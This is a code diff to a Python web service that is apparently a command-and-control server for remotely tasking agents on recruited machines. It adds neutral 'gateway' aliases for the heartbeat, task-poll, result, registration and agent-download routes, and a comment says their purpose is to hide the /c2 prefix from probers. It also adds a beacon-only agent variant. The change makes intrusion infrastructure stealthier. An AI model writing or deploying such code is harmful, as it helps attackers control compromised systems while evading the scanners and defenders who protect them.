@@ -19,6 +19,11 @@ from app.services.c2_service import (
 from app.services.events import create_event, extract_client_ip, filtered_headers
 
 router = APIRouter(prefix="/c2", tags=["c2"])
+# Neutral-aliased mount of the same handlers: recruited nodes and black-box
+# probers see a generic gateway namespace instead of a literal /c2 prefix.
+# (Both mounts serve identical handlers; the /c2 prefix stays for existing
+# deployed agents.)
+gateway_router = APIRouter(tags=["gateway"])
 settings = get_settings()
 
 
@@ -84,6 +89,7 @@ def _provided_token(payload_token: str, request: Request) -> str:
     return payload_token or request.headers.get("x-client-token", "")
 
 
+@gateway_router.post("/gateway/heartbeat")
 @router.post("/heartbeat")
 def c2_heartbeat(payload: HeartbeatPayload, request: Request):
     source_ip = extract_client_ip(request)
@@ -172,6 +178,7 @@ def c2_heartbeat(payload: HeartbeatPayload, request: Request):
     }
 
 
+@gateway_router.post("/gateway/tasks/poll")
 @router.post("/tasks/poll")
 def c2_poll_tasks(payload: TaskPollPayload, request: Request):
     with SessionLocal() as db:
@@ -185,6 +192,7 @@ def c2_poll_tasks(payload: TaskPollPayload, request: Request):
         return {"status": "ok", "task": serialize_task(task)}
 
 
+@gateway_router.post("/gateway/tasks/{task_id}/result")
 @router.post("/tasks/{task_id}/result")
 def c2_task_result(task_id: int, payload: TaskResultPayload, request: Request):
     source_ip = extract_client_ip(request)
@@ -269,12 +277,14 @@ def c2_task_result(task_id: int, payload: TaskResultPayload, request: Request):
     return {"status": "ok"}
 
 
+@gateway_router.get("/gateway/agent/download/python")
 @router.get("/agent/download/python")
 def c2_download_agent(
     server: str = "",
     agent_id: str = "",
     interval: int = 5,
     token: str = "",
+    variant: str = "",
 ):
     c2_addr = server or f"http://{settings.host}:{settings.port}"
     spec = build_agent(
@@ -282,6 +292,7 @@ def c2_download_agent(
         poll_interval=interval,
         agent_id=agent_id,
         registration_token=token,
+        beacon_only=(variant == "beacon"),
     )
     return Response(
         content=spec.content,
@@ -290,6 +301,7 @@ def c2_download_agent(
     )
 
 
+@gateway_router.post("/gateway/register")
 @router.post("/register")
 def c2_register(request: Request, src: str = ""):
     source_ip = extract_client_ip(request)
